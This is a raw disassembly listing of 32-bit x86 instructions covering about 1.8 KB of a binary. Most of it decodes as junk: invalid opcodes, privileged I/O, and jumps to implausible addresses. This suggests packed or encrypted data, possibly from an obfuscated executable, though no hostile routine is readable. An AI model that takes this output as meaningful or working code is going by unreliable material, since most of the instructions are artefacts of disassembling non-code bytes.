  403887:	mov    DWORD PTR [esi-0x2562ffe7],ebp
  40388d:	inc    edi
  40388e:	repz mov ecx,0xe0de1ce1
  403894:	mov    esi,DWORD PTR [esi-0x3cb739ee]
  40389a:	stos   DWORD PTR es:[edi],eax
  40389b:	jmp    0x9d7ccbf8
  4038a0:	and    al,0xa0
  4038a2:	mov    al,0x6
  4038a4:	xor    esp,DWORD PTR [esi+ebp*1]
  4038a7:	pop    edi
  4038a8:	fist   WORD PTR [esi-0x56dc2348]
  4038ae:	daa    
  4038af:	push   ecx
  4038b0:	imul   esi,DWORD PTR [ebp+0x4503e4b4],0xffffffb8
  4038b7:	mov    ecx,0xa2df48f1
  4038bc:	lock jae 0x403879
  4038bf:	cmp    eax,0xe908048a
  4038c4:	call   0xc6d3:0xce000002
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0xfdd405f3
  4038d5:	fwait
  4038d6:	aas    
  4038d7:	stos   BYTE PTR es:[edi],al
  4038d8:	adc    al,0x1d
  4038da:	js     0x403954
  4038dc:	(bad)  
  4038dd:	jle    0x403957
  4038df:	js     0x4038eb
  4038e1:	xchg   edi,eax
  4038e2:	xchg   ecx,eax
  4038e3:	sub    eax,0x2a76e823
  4038e8:	sub    DWORD PTR [edx-0x79576ccf],edx
  4038ee:	test   BYTE PTR [edx+0x69],bh
  4038f1:	add    edi,DWORD PTR [ebp-0x22509761]
  4038f7:	lahf   
  4038f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038f9:	cli    
  4038fa:	or     al,bh
  4038fc:	push   es
  4038fd:	jnp    0x40391d
  4038ff:	aaa    
  403900:	cmp    al,BYTE PTR [ecx+0x7f29a63c]
  403906:	cmp    ch,BYTE PTR [esi+0x7b3efe3b]
  40390c:	dec    ebp
  40390d:	add    BYTE PTR [ecx],dh
  40390f:	mov    edi,0x4c611b0e
  403914:	enter  0xc352,0xec
  403918:	ins    DWORD PTR es:[edi],dx
  403919:	cdq    
  40391a:	int    0x2
  40391c:	lods   eax,DWORD PTR ds:[esi]
  40391d:	push   ds
  40391e:	push   eax
  40391f:	ss mov bl,0xea
  403922:	sahf   
  403923:	push   0x6e
  403925:	mov    ss,WORD PTR [eax+edi*1-0x21431323]
  40392c:	cmp    cl,BYTE PTR [esi+0x17]
  40392f:	xor    BYTE PTR [eax+esi*2],0x89
  403933:	push   eax
  403934:	cmp    edx,DWORD PTR [ebx]
  403936:	sub    esp,ebx
  403938:	mov    BYTE PTR ds:0xda1cd0f7,0xc4
  40393f:	fisubr WORD PTR [eax+0xa6552f5]
  403945:	sti    
  403946:	xor    edi,DWORD PTR [eax+0xe9b4772]
  40394c:	adc    eax,0x1ecd9c6e
  403951:	enter  0x67be,0x8c
  403955:	add    cl,0xfb
  403958:	or     ecx,esp
  40395a:	dec    eax
  40395b:	or     dl,bh
  40395d:	shr    BYTE PTR [edi],cl
  40395f:	jb     0x403950
  403961:	in     eax,dx
  403962:	scas   eax,DWORD PTR es:[edi]
  403963:	pop    edi
  403964:	int3   
  403965:	mov    esi,0x80f1819c
  40396a:	xchg   DWORD PTR [edi+esi*1+0x6f21c42a],ebx
  403971:	sbb    BYTE PTR [edi-0x6f2ec1bf],0x9f
  403978:	out    0x94,eax
  40397a:	pop    ebp
  40397b:	les    esp,FWORD PTR [edx-0x32]
  40397e:	lahf   
  40397f:	or     dh,BYTE PTR [esi-0x17225a54]
  403985:	lock push 0xf
  403988:	pop    ebp
  403989:	dec    ecx
  40398a:	jecxz  0x40391d
  40398c:	cmp    DWORD PTR [ebp+0x45],esp
  40398f:	lds    eax,FWORD PTR [ebx+0x168135d3]
  403995:	lods   eax,DWORD PTR ds:[esi]
  403996:	frstor [eax+0x5db63391]
  40399c:	pop    esp
  40399d:	repnz mov al,ds:0x466e3f19
  4039a3:	dec    edx
  4039a4:	imul   edi,DWORD PTR [esi],0xa8d23af6
  4039aa:	addr16 (bad) 
  4039ac:	in     eax,dx
  4039ad:	mov    dl,0x4a
  4039af:	xchg   ebx,eax
  4039b0:	pusha  
  4039b1:	pop    es
  4039b2:	call   0x6aca:0x2d8b7bd4
  4039b9:	js     0x403a1e
  4039bb:	(bad)  
  4039bc:	sti    
  4039bd:	retf   
  4039be:	or     BYTE PTR [edi],bl
  4039c0:	xchg   ecx,eax
  4039c1:	push   cs
  4039c2:	imul   ebx,DWORD PTR cs:[ebx],0xffffffcd
  4039c6:	repz pop ecx
  4039c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039c9:	das    
  4039ca:	data16 or dl,ch
  4039cd:	retf   
  4039ce:	jge    0x4039ce
  4039d0:	pusha  
  4039d1:	in     al,0x39
  4039d3:	shl    dh,0x59
  4039d6:	rcr    BYTE PTR [ecx+0x1d99751f],cl
  4039dc:	jle    0x403a0e
  4039de:	test   al,0xb3
  4039e0:	fnstenv ds:0x40237eee
  4039e6:	push   ss
  4039e7:	dec    ebp
  4039e8:	loopne 0x403a40
  4039ea:	nop    edx
  4039ed:	(bad)  
  4039ee:	mov    ebp,0x7bdd9575
  4039f3:	cmp    BYTE PTR [eax-0x4a],0x29
  4039f7:	jb     0x403a55
  4039f9:	in     eax,0xbb
  4039fb:	pop    esp
  4039fc:	mov    al,ds:0xc570f0a3
  403a01:	mov    cl,0xcb
  403a03:	add    dl,BYTE PTR [eax-0x2acf2ae]
  403a09:	cmc    
  403a0a:	ss inc ecx
  403a0c:	js     0x403a81
  403a0e:	gs jb  0x403a67
  403a11:	hlt    
  403a12:	aaa    
  403a13:	ret    
  403a14:	jg     0x403a61
  403a16:	pusha  
  403a17:	push   esp
  403a18:	add    eax,DWORD PTR [esp+ebx*8-0x446f5f92]
  403a1f:	and    DWORD PTR [ebp+0x4a],esi
  403a22:	test   eax,0xc9be5b64
  403a27:	ret    
  403a28:	adc    bl,ah
  403a2a:	(bad)  
  403a2b:	adc    BYTE PTR [edi-0x75],dh
  403a2e:	pop    eax
  403a2f:	mov    bh,0x8f
  403a31:	dec    edi
  403a32:	test   DWORD PTR [ecx-0x33],esi
  403a35:	jmp    0x329d448a
  403a3a:	call   0xdbde:0xb89d974
  403a41:	loopne 0x4039c7
  403a43:	push   ecx
  403a44:	out    0x29,eax
  403a46:	push   0x709c2bf1
  403a4b:	push   ebx
  403a4c:	shl    BYTE PTR [ecx+0x217cac5],1
  403a52:	sti    
  403a53:	push   esp
  403a54:	or     al,BYTE PTR [eax]
  403a56:	scas   eax,DWORD PTR es:[edi]
  403a57:	sub    DWORD PTR [edi-0x13266cd2],esi
  403a5d:	mov    esi,0x81339b52
  403a62:	retf   
  403a63:	mov    eax,ds:0xe5fab6da
  403a68:	frstor [eax]
  403a6a:	stos   BYTE PTR es:[edi],al
  403a6b:	lock cmp DWORD PTR [eax+0x6f],ecx
  403a6f:	scas   eax,DWORD PTR es:[edi]
  403a70:	mov    cl,0x17
  403a72:	rcl    DWORD PTR [edi+0x77],cl
  403a75:	mov    edx,0x5d58b7e3
  403a7a:	cld    
  403a7b:	ins    BYTE PTR es:[edi],dx
  403a7c:	jl     0x403ab2
  403a7e:	mov    ebx,0x97c97c56
  403a83:	call   0x7fdc795f
  403a88:	push   eax
  403a89:	test   eax,0x3844d333
  403a8e:	and    dl,BYTE PTR [edi-0x5a38c62b]
  403a94:	xor    DWORD PTR [ecx-0x331e251c],eax
  403a9a:	int3   
  403a9b:	add    eax,0xa884ae41
  403aa0:	in     eax,0xda
  403aa2:	fucomi st,st(6)
  403aa4:	jmp    0x7600:0x72f8744
  403aab:	fcmovbe st,st(7)
  403aad:	mov    ebp,0xe204d05b
  403ab2:	lock mov al,0x6
  403ab5:	loopne 0x403b01
  403ab7:	add    BYTE PTR [eax-0x5b],bh
  403aba:	add    DWORD PTR [eax+0x19],eax
  403abd:	xor    BYTE PTR [eax],dh
  403abf:	sbb    DWORD PTR [edx-0x41e32cf3],0xfffffffc
  403ac6:	(bad)  
  403ac8:	xor    ah,cl
  403aca:	js     0x403a58
  403acc:	adc    ebp,ebx
  403ace:	mov    ebp,0xf8e2c58f
  403ad3:	jno    0x403b01
  403ad5:	adc    eax,0x79fa9f83
  403ada:	pop    ecx
  403adb:	add    BYTE PTR gs:[edi],bh
  403ade:	mov    bh,0x4b
  403ae0:	(bad)  [esp+eax*2+0x5d021837]
  403ae7:	dec    ebx
  403ae8:	mov    eax,ds:0x9afffc8
  403aed:	ret    
  403aee:	lds    eax,FWORD PTR ds:0xed8b19fc
  403af4:	and    al,0xd
  403af6:	ficomp WORD PTR [edx-0x516d8093]
  403afc:	outs   dx,BYTE PTR ds:[esi]
  403afd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403afe:	pop    edx
  403aff:	nop
  403b00:	ror    BYTE PTR [eax+ebx*8+0x1e8cd21d],1
  403b07:	push   ss
  403b08:	push   eax
  403b09:	loope  0x403b27
  403b0b:	cwde   
  403b0c:	sbb    dl,BYTE PTR [edi]
  403b0e:	rcr    bh,1
  403b10:	mov    ds:0xef19f765,al
  403b15:	push   edi
  403b16:	enter  0xa8d7,0x97
  403b1a:	popa   
  403b1b:	cmp    BYTE PTR [ebx+0x62],bl
  403b1e:	add    eax,0xea13da4b
  403b23:	scas   al,BYTE PTR es:[edi]
  403b24:	loop   0x403b88
  403b26:	inc    ebx
  403b27:	into   
  403b28:	dec    ecx
  403b29:	lock mov ds:0xdbd4b7a2,eax
  403b2f:	and    al,0x44
  403b31:	mov    al,0xe2
  403b33:	inc    esp
  403b34:	in     al,0xea
  403b36:	fldenv ss:[ecx+edx*2]
  403b3a:	std    
  403b3b:	cmp    al,0x8b
  403b3d:	pop    esi
  403b3e:	pop    ds
  403b3f:	cld    
  403b40:	test   dl,al
  403b42:	ins    BYTE PTR es:[edi],dx
  403b43:	retfw  
  403b45:	daa    
  403b46:	jmp    0xa6131481
  403b4b:	pop    edx
  403b4c:	inc    esi
  403b4d:	cdq    
  403b4e:	and    al,0x73
  403b50:	int3   
  403b51:	icebp  
  403b52:	cmp    eax,0xca612d33
  403b57:	inc    esp
  403b58:	mov    cl,0x9d
  403b5a:	sub    bh,al
  403b5c:	jb     0x403b2f
  403b5e:	dec    ecx
  403b5f:	imul   edx,DWORD PTR [ecx+0x343b049d],0x43
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	sbb    DWORD PTR [eax+0x46],esp
  403b82:	mov    DWORD PTR [edx-0x18787dd],ebx
  403b88:	jle    0x403c02
  403b8a:	js     0x403bbe
  403b8c:	mov    DWORD PTR [eax+0x5b2ada3d],ebp
  403b92:	pop    ecx
  403b93:	adc    al,0xfc
  403b95:	cmp    DWORD PTR [ebx+0x17],ecx
  403b98:	fisttp WORD PTR [edi]
  403b9a:	add    ecx,DWORD PTR [edi+0x79e76341]
  403ba0:	clc    
  403ba1:	push   edi
  403ba2:	mov    db4,edi
  403ba5:	and    al,0x23
  403ba7:	jbe    0x403b96
  403ba9:	retf   
  403baa:	imul   ebp,esi,0xd9290d87
  403bb0:	push   ecx
  403bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bb2:	sub    dl,bl
  403bb4:	sbb    cl,BYTE PTR [eax+0x6166d46]
  403bba:	sub    ecx,DWORD PTR [edx+0x6bff3359]
  403bc0:	cmp    BYTE PTR [ecx*1-0x45853f76],bh
  403bc7:	pop    edi
  403bc8:	stc    
  403bc9:	jge    0x403bef
  403bcb:	jp     0x403bf3
  403bcd:	add    BYTE PTR [eax-0x4f055db6],ah
  403bd3:	push   cs
  403bd4:	xlat   BYTE PTR ds:[ebx]
  403bd5:	push   eax
  403bd6:	push   0x21c7697c
  403bdb:	jle    0x403b98
  403bdd:	cwde   
  403bde:	jne    0x403bbc
  403be0:	cmp    dh,ch
  403be2:	inc    DWORD PTR [esp+edi*4-0x25]
  403be6:	push   edi
  403be7:	sub    DWORD PTR [ecx+0x64a1d34],ecx
  403bed:	ret    0x95bd
  403bf0:	adc    edx,DWORD PTR [ebx+0xb4005be]
  403bf6:	add    dl,BYTE PTR [ebp+ebp*4-0x3a]
  403bfa:	mov    edx,0x5bee8708
  403bff:	imul   esp,esp,0xee585d9
  403c05:	fst    QWORD PTR [ebx-0x80]
  403c08:	pop    esi
  403c09:	pop    esi
  403c0a:	cdq    
  403c0b:	gs mov cl,0x20
  403c0e:	int3   
  403c0f:	push   0x71118b97
  403c14:	icebp  
  403c15:	lock mov ds:0x3fae58eb,eax
  403c1b:	(bad)  
  403c1c:	sub    al,0xab
  403c1e:	pop    edx
  403c1f:	ja     0x403c1f
  403c21:	fistp  QWORD PTR gs:[ebp+0x25]
  403c25:	jmp    DWORD PTR [ebp+0x59]
  403c28:	mov    bl,0x11
  403c2a:	repnz lahf 
  403c2c:	mov    ds:0xb7b69797,al
  403c31:	or     BYTE PTR [ecx],0x56
  403c34:	push   eax
  403c35:	mov    ebp,0xc8ae1d46
  403c3a:	mov    cl,0x35
  403c3c:	jb     0x403be2
  403c3e:	ret    0x4f6e
  403c41:	fstp   QWORD PTR [edi]
  403c43:	mov    al,0xf5
  403c45:	jo     0x403bcb
  403c47:	fiadd  DWORD PTR [eax]
  403c49:	je     0x403bec
  403c4b:	xor    ch,0x80
  403c4e:	sbb    al,0x1c
  403c50:	int3   
  403c51:	push   esp
  403c52:	and    al,0x3e
  403c54:	cmp    al,0x74
  403c56:	xchg   ecx,eax
  403c57:	cs ins BYTE PTR es:[edi],dx
  403c59:	aam    0x2c
  403c5b:	loop   0x403c2c
  403c5d:	adc    edi,edx
  403c5f:	fs loope 0x403c94
  403c62:	xor    BYTE PTR [ebx],ah
  403c64:	mov    ds:0x17bd6804,eax
  403c69:	(bad)  ss:[esi+ecx*1+0x7a60b9b3]
  403c71:	rcr    DWORD PTR [esi],1
  403c73:	xchg   edx,eax
  403c74:	in     al,0x6d
  403c76:	je     0x403cf6
  403c78:	shl    al,cl
  403c7a:	lock enter 0x47fa,0x54
  403c7f:	fdivr  QWORD PTR [esi+0x2c0318de]
  403c85:	mov    edx,0x6d30b462
  403c8a:	fwait
  403c8b:	fwait
  403c8c:	aam    0x50
  403c8e:	jb     0x403c18
  403c90:	mov    ebp,0x2c0d8ca5
  403c95:	fld    TBYTE PTR [ebp+eax*8+0xd869115]
  403c9c:	xchg   BYTE PTR [eax],ch
  403c9e:	pop    eax
  403c9f:	fisttp QWORD PTR [edx-0x37]
  403ca2:	enter  0x688d,0xc3
  403ca6:	and    cl,dl
  403ca8:	out    0x5a,eax
  403caa:	inc    ecx
  403cab:	test   DWORD PTR [ecx-0x4b],esi
  403cae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403caf:	jnp    0x403c87
  403cb1:	dec    esp
  403cb2:	int    0x66
  403cb4:	sahf   
  403cb5:	adc    edi,DWORD PTR [edx+0x1bf95fdb]
  403cbb:	mov    ebp,0xb0982af
  403cc0:	and    BYTE PTR [edx+eiz*4+0x11],dl
  403cc4:	sbb    eax,0x448e3768
  403cc9:	and    dl,BYTE PTR [ebx-0x22b3999]
  403ccf:	icebp  
  403cd0:	outs   dx,DWORD PTR ds:[esi]
  403cd1:	xchg   esp,eax
  403cd2:	mov    esi,0xb4373fbb
  403cd7:	and    eax,0xcb4c3759
  403cdc:	rol    DWORD PTR [eax+0x0],1
  403cdf:	dec    esp
  403ce0:	mov    eax,ds:0xe575a4cb
  403ce5:	push   es
  403ce6:	outs   dx,BYTE PTR ds:[esi]
  403ce7:	pop    esi
  403ce8:	or     DWORD PTR [edx+0x96c2f69],ebp
  403cee:	in     al,0x42
  403cf0:	cs xor eax,ecx
  403cf3:	fst    QWORD PTR ds:0x3e90e225
  403cf9:	and    ch,ch
  403cfb:	sbb    ebp,DWORD PTR [ebp+0x72]
  403cfe:	sub    BYTE PTR [ebx-0x4d288c08],cl
  403d04:	ret    0xa6d1
  403d07:	sbb    BYTE PTR [ecx],al
  403d09:	pop    edx
  403d0a:	ficom  WORD PTR [eax+edx*1]
  403d0d:	popf   
  403d0e:	and    al,0x9b
  403d10:	and    DWORD PTR [edi+0x22f59796],ebx
  403d16:	test   cl,bh
  403d18:	nop
  403d19:	or     bl,BYTE PTR [ebx+0x5fc5dd7e]
  403d1f:	into   
  403d20:	fs xchg esi,eax
  403d22:	jae    0x403d7d
  403d24:	ins    DWORD PTR es:[edi],dx
  403d25:	xchg   ebp,eax
  403d26:	cmp    BYTE PTR [edi-0x39f64e1f],dl
  403d2c:	pop    ecx
  403d2d:	push   0xfdc36b3b
  403d32:	pusha  
  403d33:	push   0xd
  403d35:	loop   0x403d93
  403d37:	xor    bl,BYTE PTR [esi-0x11fdd6e9]
  403d3d:	pop    ecx
  403d3e:	adc    esp,DWORD PTR [ecx+0x25c2373a]
  403d44:	shl    esi,1
  403d46:	stos   DWORD PTR es:[edi],eax
  403d47:	mov    dl,0xc
  403d49:	mov    esp,0x8055c2f
  403d4e:	(bad)
  403d51:	adc    DWORD PTR [edi+0x4d83e67d],esp
  403d57:	sbb    eax,0x138dcde0
  403d5c:	push   ss
  403d5d:	ss sub eax,0xbd1e4ea
  403d63:	xor    al,0xcc
  403d65:	ds stc 
  403d67:	cld    
  403d68:	jp     0x403d89
  403d6a:	push   0x31d67f0a
  403d6f:	jmp    DWORD PTR [ebp+0x35]
  403d72:	mov    edx,0xa0c3cac8
  403d77:	cdq    
  403d78:	and    BYTE PTR [edx+0x58],dh
  403d7b:	fist   WORD PTR [eax+esi*4+0x66]
  403d7f:	xchg   esi,eax
  403d80:	shl    BYTE PTR [edx+0x62bea021],1
  403d86:	add    eax,0x9dbe3b3e
  403d8b:	sbb    ecx,DWORD PTR [ecx]
  403d8d:	(bad)  
  403d8e:	(bad)  
  403d8f:	ins    DWORD PTR es:[edi],dx
  403d90:	mov    cl,0x70
  403d92:	test   eax,0x17310fd1
  403d97:	jns    0x403de4
  403d99:	inc    eax
  403d9a:	aaa    
  403d9b:	cmp    esi,DWORD PTR [ebp+edi*1-0x6277b9e1]
  403da2:	idiv   DWORD PTR [ebx-0x67]
  403da5:	ret    0xa632
  403da8:	xchg   edx,eax
  403da9:	shr    BYTE PTR [ebp-0xc],cl
  403dac:	test   al,0x85
  403dae:	test   al,0x1f
  403db0:	xor    esi,DWORD PTR [eax]
  403db2:	add    eax,0x88f36916
  403db7:	xchg   ch,al
  403db9:	ror    DWORD PTR [edi],cl
  403dbb:	das    
  403dbc:	scas   al,BYTE PTR es:[edi]
  403dbd:	call   0x6b5e696c
  403dc2:	sub    eax,0x2ff644cb
  403dc7:	xor    eax,0x7c487aee
  403dcc:	in     eax,0xb
  403dce:	sub    esp,DWORD PTR [ebp-0x5579c773]
  403dd4:	pop    edi
  403dd5:	jl     0x403dd1
  403dd7:	cmc    
  403dd8:	xor    DWORD PTR [eax],ebx
  403dda:	cmp    eax,0x1c4e8e55
  403ddf:	dec    ecx
  403de0:	aaa    
  403de1:	or     BYTE PTR ds:0x91673565,dl
  403de7:	jnp    0x403dd8
  403de9:	pusha  
  403dea:	scas   eax,DWORD PTR es:[edi]
  403deb:	cli    
  403dec:	push   ebp
  403ded:	push   edx
  403dee:	pop    esp
  403def:	cmp    al,BYTE PTR [edi]
  403df1:	hlt    
  403df2:	js     0x403d9d
  403df4:	aaa    
  403df5:	mov    dl,dl
  403df7:	mov    esi,0x3542ebb7
  403dfc:	fcom   DWORD PTR [ebp-0x1f]
  403dff:	in     eax,dx
  403e00:	push   esi
  403e01:	outs   dx,BYTE PTR ds:[esi]
  403e02:	mov    ds:0x7c4f7a31,eax
  403e07:	test   BYTE PTR ds:0x4f2ad632,dh
  403e0d:	mov    eax,DWORD PTR [ebp+0x8]
  403e10:	mov    ecx,DWORD PTR [ebp-0x8]
  403e13:	xor    eax,esi
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0x62dd8593
  403e30:	jle    0x403e41
  403e32:	pusha  
  403e33:	sbb    BYTE PTR [eax],ah
  403e35:	js     0x403eaf
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403e94
  403e3c:	outs   dx,BYTE PTR ds:[esi]
  403e3d:	ficomp DWORD PTR [ecx+edx*8]
  403e40:	mov    dl,0xda
  403e42:	mov    eax,DWORD PTR [esi-0x2f]
  403e45:	shl    BYTE PTR [edx+0xc],1
  403e48:	mov    al,0x2e
  403e4a:	into   
  403e4b:	lock xchg ebp,eax
  403e4d:	or     BYTE PTR [edi+0x47eb2d56],0xe1
  403e54:	pop    edx
  403e55:	add    al,0xbd
  403e57:	ror    BYTE PTR [ecx],0x1e
  403e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e5b:	cmc    
  403e5c:	add    DWORD PTR [ecx+ebx*1],0xffffffb3
  403e60:	mov    edi,0x932eae2c
  403e65:	addr16 push esi
  403e67:	dec    esi
  403e68:	cli    
  403e69:	inc    esp
  403e6a:	fcomp  QWORD PTR [ebx-0x5895db0a]
  403e70:	xchg   edx,eax
  403e71:	div    ecx
  403e73:	ins    DWORD PTR es:[edi],dx
  403e74:	imul   DWORD PTR [esi+0x64011b0d]
  403e7a:	leave  
  403e7b:	pop    ebp
  403e7c:	xlat   BYTE PTR ds:[ebx]
  403e7d:	retf   0x4e0
  403e80:	xchg   ebp,eax
  403e81:	in     eax,dx
  403e82:	retf   
  403e83:	and    bh,al
  403e85:	je     0x403ee7
  403e87:	dec    edi
  403e88:	and    BYTE PTR [eax+0x331a7973],ch
  403e8e:	fwait
  403e8f:	iret   
  403e90:	arpl   WORD PTR [ecx],sp
  403e92:	add    bh,BYTE PTR [edx-0x39]
  403e95:	call   0x7d2d:0xa133c52f
  403e9c:	addr16 xchg esi,eax
  403e9e:	mov    esi,fs
  403ea0:	fidivr WORD PTR ds:0x52b692d0
  403ea6:	retf   
  403ea7:	ins    BYTE PTR es:[edi],dx
  403ea8:	stc    
  403ea9:	(bad)  
  403eab:	cmp    eax,0x1b8b4edb
  403eb0:	cmp    cl,BYTE PTR [edi-0x558941b1]
  403eb6:	adc    DWORD PTR [ebx-0x3c],0xffffffb1
  403eba:	mov    edi,0xc342dcab
  403ebf:	push   ebp
  403ec0:	(bad)
  403ec3:	jecxz  0x403edd
  403ec5:	xchg   esi,eax
  403ec6:	mov    WORD PTR [esi+eax*4],ds
  403ec9:	call   0x62e5:0x7c18c07d
  403ed0:	jp     0x403f34
  403ed2:	adc    DWORD PTR [esi],ebp
  403ed4:	jp     0x403f2c
  403ed6:	fs mov esi,0x5441e01d
  403edc:	retf   
  403edd:	lock retf 
  403edf:	pop    edx
  403ee0:	bound  edi,QWORD PTR [edi+0x29e2f2ba]
  403ee6:	fucom  st(5)
  403ee8:	pop    ds
  403ee9:	xchg   ebp,eax
  403eea:	xchg   esi,eax
  403eeb:	mov    eax,0x65722db5
  403ef0:	in     al,0x46
  403ef2:	test   DWORD PTR [ebp+0x44],ebx
  403ef5:	and    eax,0x69bc91b
  403efa:	aam    0xd3
  403efc:	(bad)  
  403efe:	push   edi
  403eff:	mov    ss,WORD PTR [edi-0x72]
  403f02:	xchg   ecx,eax
  403f03:	mov    ds:0xcfcb21d8,eax
  403f08:	cmp    eax,0x5b490c59
  403f0d:	repnz cmp bh,BYTE PTR ds:[edi-0x35]
  403f12:	sbb    DWORD PTR [ecx-0x549d9a13],esi
  403f18:	mov    gs,WORD PTR [esp+edx*1+0x38]
  403f1c:	add    BYTE PTR [eax],al
  403f1e:	jmp    0xc0b8361a
  403f23:	out    0x49,eax
  403f25:	xchg   DWORD PTR [edx],esi
  403f27:	pop    ebx
  403f28:	ja     0x403eb7
  403f2a:	addr16 ja 0x403f0c
  403f2d:	repnz fidivr DWORD PTR [ebp+ebp*1+0x4111f5fd]
  403f35:	mov    dh,0x6d
  403f37:	dec    ecx
  403f38:	repz pop es
  403f3a:	int3   
  403f3b:	push   ecx
  403f3c:	dec    ebp
  403f3d:	fidiv  WORD PTR [esi]
  403f3f:	push   0x7f7cbf94
  403f44:	sahf   
  403f45:	dec    esi
  403f46:	retf   
  403f47:	mov    dl,0xaf
  403f49:	lea    ebp,[ecx]
  403f4b:	(bad)  
  403f4d:	or     ecx,DWORD PTR [ebx]
  403f4f:	clc    
  403f50:	lahf   
  403f51:	or     eax,0xe5ceeba4
  403f56:	cmp    cl,bl
  403f58:	mov    ds:0xd3d0bf56,eax
  403f5d:	dec    edx
  403f5e:	mov    eax,0x92dc51a2
  403f63:	push   edi
  403f64:	xchg   edx,eax
  403f65:	mov    eax,ds:0x100e8d1a
  403f6a:	rcl    DWORD PTR [ecx-0x5999d82e],0xf
  403f71:	out    dx,al
  403f72:	cmp    ebx,DWORD PTR [edi]
  403f74:	pop    esp
  403f75:	loopne 0x403f5d
  403f77:	sbb    cl,cl
  403f79:	add    BYTE PTR [ebp+0x1fa27ad0],dl
  403f7f:	ret    
  403f80:	sahf   
  403f81:	inc    edi
  403f82:	xchg   BYTE PTR [eax+0x9],dh
  403f85:	mov    WORD PTR [eax+0x4ffc2bca],ds
  403f8b:	scas   al,BYTE PTR es:[edi]
  403f8c:	pop    ss
  403f8d:	dec    ebx
  403f8e:	lahf   
  403f8f:	add    ah,bh
  403f91:	sbb    eax,0xe0f2a7c9
  403f96:	adc    al,0x24
  403f98:	fwait
  403f99:	xchg   esi,eax
  403f9a:	mov    esp,0xcb6d8ac4
  403f9f:	(bad)  
  403fa0:	std    
  403fa1:	dec    esp
  403fa2:	jg     0x403f57
  403fa4:	retf   0x67b8
  403fa7:	mov    ah,0xd7
  403fa9:	pop    ss
  403faa:	mov    eax,0xbbb39033
  403faf:	test   al,0x17
  403fb1:	xor    DWORD PTR [eax],0x1c
  403fb4:	into   
  403fb5:	sbb    al,0xee
  403fb7:	jmp    FWORD PTR [ebx+0x24]
  403fba:	in     al,dx
  403fbb:	push   ecx
  403fbc:	mov    bl,0xbf
  403fbe:	xchg   BYTE PTR [ecx+esi*8],ah
  403fc1:	xchg   esp,eax
  403fc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fc3:	fcomp  QWORD PTR [eax]
  403fc5:	sar    BYTE PTR [edx],1
  403fc7:	adc    cl,BYTE PTR ds:0x982a698c
  403fcd:	mov    eax,0x4069074f
  403fd2:	loop   0x403fe0
  403fd4:	mov    dl,0xae
  403fd6:	lods   al,BYTE PTR ds:[esi]
  403fd7:	adc    DWORD PTR [ebx-0x34fe0652],eax
  403fdd:	push   cs
  403fde:	ss pop ebx
  403fe0:	and    BYTE PTR [ebx],0x34
  403fe3:	jmp    0x690931ba
  403fe8:	or     esi,DWORD PTR [di-0x3e55]
  403fed:	hlt    
  403fee:	test   DWORD PTR [ebp+0x5451a147],ecx
  403ff4:	push   ecx
  403ff5:	mov    al,BYTE PTR [ebp+0x252b2be8]
  403ffb:	(bad)  
  403ffc:	aam    0x60
  403ffe:	adc    eax,0x7a
  404001:	mov    dl,0xe9
  404003:	pushf  
  404004:	jmp    0x404040
  404006:	pushf  
  404007:	pop    eax
  404008:	cmc    
  404009:	cdq    
  40400a:	in     al,0x6c
  40400c:	mov    edx,cs
  40400e:	iret   
  40400f:	mov    cl,0x71
  404011:	push   edx
  404012:	lea    ecx,[esi]
  404014:	sti    
  404015:	cmc    
  404016:	out    dx,eax
  404017:	es fwait
  404019:	js     0x404049
  40401b:	xchg   ebx,eax
  40401c:	dec    edx
  40401d:	mov    edi,0x3b8cb1bd
  404022:	repnz cmp esp,esi
  404025:	mov    esi,edx
  404027:	lods   eax,DWORD PTR ds:[esi]
  404028:	pop    edx
  404029:	inc    ecx
  40402a:	push   edi
  40402b:	iret   
  40402c:	dec    esp
  40402d:	int3   
  40402e:	xor    eax,0xeb7fb7a0
  404033:	adc    DWORD PTR [ecx-0x763e8a1d],0x411b6df2
  40403d:	imul   ecx,ecx,0x32bbc298
  404043:	test   BYTE PTR ds:0x8f3b2fff,dh
  404049:	xchg   ecx,eax
  40404a:	int    0xfc
  40404c:	mov    dl,0xb2
  40404e:	aam    0x6a
  404050:	xchg   edi,eax
  404051:	into   
  404052:	ret    
  404053:	or     BYTE PTR [ecx-0x63d89443],bl
  404059:	(bad)  [eax-0x3e]
  40405c:	inc    esp
  40405d:	inc    esp
  40405e:	or     al,0xb8
  404060:	mov    eax,0x38eb5a02
  404065:	les    ebp,FWORD PTR [edx-0xa]
  404068:	and    al,0x20
  40406a:	mov    ?,ecx
  40406c:	push   esp
  40406d:	inc    esi
  40406e:	xor    cl,al
  404070:	sbb    edi,DWORD PTR [eax-0x71c6c42]
  404076:	cmp    esp,DWORD PTR [ebx+ecx*1]
  404079:	call   0x52e2:0xa3dbe447
  404080:	ss sbb esi,esi
  404083:	adc    BYTE PTR [ebx+0x7e4365c8],ah
  404089:	pop    edx
  40408a:	clc    
  40408b:	fldcw  WORD PTR [edx-0x6f]
  40408e:	or     eax,0x93608fc7
  404093:	cwde   
  404094:	sub    DWORD PTR [esi],edx
  404096:	fdiv   DWORD PTR [esp+eiz*8+0x3]
  40409a:	not    ebx
  40409c:	push   0xbf545eca
  4040a1:	scas   al,BYTE PTR es:[edi]
  4040a2:	retf   0x533e
  4040a5:	(bad)  
  4040a6:	dec    esp
  4040a7:	pop    ecx
  4040a8:	retf   
  4040a9:	(bad)  
  4040aa:	retf   
  4040ab:	mov    ch,0x8
  4040ad:	xchg   ebp,eax
  4040ae:	bound  edx,QWORD PTR [ebp+0x7a]
